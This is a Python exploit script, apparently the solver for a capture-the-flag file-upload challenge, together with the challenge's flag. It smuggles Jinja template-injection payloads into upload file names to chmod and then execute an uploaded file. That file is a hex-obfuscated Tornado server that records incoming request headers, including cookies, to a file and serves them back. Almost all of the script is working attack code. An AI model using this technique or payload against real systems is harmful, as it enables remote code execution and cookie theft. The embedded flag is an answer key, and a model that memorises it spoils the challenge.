#!/usr/bin/env python3
import sys
import requests
import io

def create_bytes(data):
    str_hex_raw = ("," + data.hex(","))
    str_hex = str_hex_raw.replace(",", ",0x").strip(",")
    return "bytes([" + str_hex + "])"

def create_string(text):
    data = bytes(text, "utf-8")
    return "str(" + create_bytes(data) + ",sys.stdout.encoding)"

perm_name = "{% import os,sys,stat %}{{ os.chmod(" + create_string("/uploads/p.py") + ",stat.S_IRWXU) }}"
swap_name = "{% import os,sys %}{{ os.execl(" + create_string("/uploads/p.py") + "," + create_string("/uploads/p.py") + ") }}"

def post_file(name, endpoint, payload):
    with io.BytesIO(payload) as f:
        with requests.post(endpoint, files={name: (name, f)}) as r:
            print("Status code {}".format(r.status_code))

def get_redirect(endpoint):
    with requests.get(endpoint) as r:
        return r.url

def run_test(payload):
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://files.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1]

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        current_endpoint = get_redirect(base_endpoint)
        post_file("p.py", current_endpoint, payload)
        post_file(perm_name, current_endpoint, payload)
        post_file(swap_name, current_endpoint, payload)
        requests.get(current_endpoint)
        resp_text = requests.get(current_endpoint).text
        print(resp_text)
    assert "TG20{skilled_statistic_unhappily_icing}" in resp_text

def solver_entry(payload):
    try:
        run_test(payload)
    except (OSError, AssertionError, NameError):
        sys.exit(102)
    else:
        sys.exit(101)

solver_entry(bytes([0x23,0x21,0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x65,0x6e,0x76,0x20,0x70,0x79,0x74,0x68,0x6f,0x6e,0x33,0x0a,0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x73,0x6f,0x63,0x6b,0x65,0x74,0x0a,0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x69,0x6f,0x6c,0x6f,0x6f,0x70,0x0a,0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x77,0x65,0x62,0x0a,0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x68,0x74,0x74,0x70,0x73,0x65,0x72,0x76,0x65,0x72,0x0a,0x0a,0x56,0x53,0x4f,0x43,0x4b,0x5f,0x50,0x4f,0x52,0x54,0x20,0x3d,0x20,0x32,0x30,0x30,0x30,0x0a,0x56,0x53,0x4f,0x43,0x4b,0x5f,0x43,0x49,0x44,0x20,0x3d,0x20,0x32,0x30,0x0a,0x0a,0x63,0x6c,0x61,0x73,0x73,0x20,0x4d,0x61,0x69,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x28,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x77,0x65,0x62,0x2e,0x52,0x65,0x71,0x75,0x65,0x73,0x74,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x29,0x3a,0x0a,0x20,0x20,0x20,0x20,0x64,0x65,0x66,0x20,0x67,0x65,0x74,0x28,0x73,0x65,0x6c,0x66,0x29,0x3a,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x77,0x69,0x74,0x68,0x20,0x6f,0x70,0x65,0x6e,0x28,0x27,0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x63,0x6f,0x6f,0x6b,0x69,0x65,0x73,0x2e,0x74,0x78,0x74,0x27,0x2c,0x20,0x27,0x61,0x2b,0x27,0x29,0x20,0x61,0x73,0x20,0x66,0x3a,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x66,0x2e,0x77,0x72,0x69,0x74,0x65,0x28,0x73,0x74,0x72,0x28,0x73,0x65,0x6c,0x66,0x2e,0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x2e,0x68,0x65,0x61,0x64,0x65,0x72,0x73,0x29,0x29,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x77,0x69,0x74,0x68,0x20,0x6f,0x70,0x65,0x6e,0x28,0x27,0x2f,0x75,0x70,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x63,0x6f,0x6f,0x6b,0x69,0x65,0x73,0x2e,0x74,0x78,0x74,0x27,0x2c,0x20,0x27,0x72,0x27,0x29,0x20,0x61,0x73,0x20,0x66,0x3a,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x73,0x65,0x6c,0x66,0x2e,0x66,0x69,0x6e,0x69,0x73,0x68,0x28,0x66,0x2e,0x72,0x65,0x61,0x64,0x28,0x29,0x29,0x0a,0x0a,0x64,0x65,0x66,0x20,0x6d,0x61,0x6b,0x65,0x5f,0x61,0x70,0x70,0x28,0x29,0x3a,0x0a,0x20,0x20,0x20,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x77,0x65,0x62,0x2e,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x28,0x5b,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x28,0x72,0x22,0x2f,0x22,0x2c,0x20,0x4d,0x61,0x69,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,0x29,0x2c,0x0a,0x20,0x20,0x20,0x20,0x5d,0x29,0x0a,0x0a,0x69,0x66,0x20,0x5f,0x5f,0x6e,0x61,0x6d,0x65,0x5f,0x5f,0x20,0x3d,0x3d,0x20,0x22,0x5f,0x5f,0x6d,0x61,0x69,0x6e,0x5f,0x5f,0x22,0x3a,0x0a,0x20,0x20,0x20,0x20,0x73,0x6f,0x63,0x6b,0x20,0x3d,0x20,0x73,0x6f,0x63,0x6b,0x65,0x74,0x2e,0x73,0x6f,0x63,0x6b,0x65,0x74,0x28,0x73,0x6f,0x63,0x6b,0x65,0x74,0x2e,0x41,0x46,0x5f,0x56,0x53,0x4f,0x43,0x4b,0x2c,0x20,0x73,0x6f,0x63,0x6b,0x65,0x74,0x2e,0x53,0x4f,0x43,0x4b,0x5f,0x53,0x54,0x52,0x45,0x41,0x4d,0x20,0x7c,0x20,0x73,0x6f,0x63,0x6b,0x65,0x74,0x2e,0x53,0x4f,0x43,0x4b,0x5f,0x43,0x4c,0x4f,0x45,0x58,0x45,0x43,0x20,0x7c,0x20,0x73,0x6f,0x63,0x6b,0x65,0x74,0x2e,0x53,0x4f,0x43,0x4b,0x5f,0x4e,0x4f,0x4e,0x42,0x4c,0x4f,0x43,0x4b,0x29,0x0a,0x20,0x20,0x20,0x20,0x73,0x6f,0x63,0x6b,0x2e,0x62,0x69,0x6e,0x64,0x28,0x28,0x56,0x53,0x4f,0x43,0x4b,0x5f,0x43,0x49,0x44,0x2c,0x20,0x56,0x53,0x4f,0x43,0x4b,0x5f,0x50,0x4f,0x52,0x54,0x29,0x29,0x0a,0x20,0x20,0x20,0x20,0x73,0x6f,0x63,0x6b,0x2e,0x6c,0x69,0x73,0x74,0x65,0x6e,0x28,0x29,0x0a,0x20,0x20,0x20,0x20,0x61,0x70,0x70,0x20,0x3d,0x20,0x6d,0x61,0x6b,0x65,0x5f,0x61,0x70,0x70,0x28,0x29,0x0a,0x20,0x20,0x20,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x20,0x3d,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x68,0x74,0x74,0x70,0x73,0x65,0x72,0x76,0x65,0x72,0x2e,0x48,0x54,0x54,0x50,0x53,0x65,0x72,0x76,0x65,0x72,0x28,0x61,0x70,0x70,0x29,0x0a,0x20,0x20,0x20,0x20,0x73,0x65,0x72,0x76,0x65,0x72,0x2e,0x61,0x64,0x64,0x5f,0x73,0x6f,0x63,0x6b,0x65,0x74,0x28,0x73,0x6f,0x63,0x6b,0x29,0x0a,0x20,0x20,0x20,0x20,0x74,0x6f,0x72,0x6e,0x61,0x64,0x6f,0x2e,0x69,0x6f,0x6c,0x6f,0x6f,0x70,0x2e,0x49,0x4f,0x4c,0x6f,0x6f,0x70,0x2e,0x63,0x75,0x72,0x72,0x65,0x6e,0x74,0x28,0x29,0x2e,0x73,0x74,0x61,0x72,0x74,0x28,0x29,0x0a]))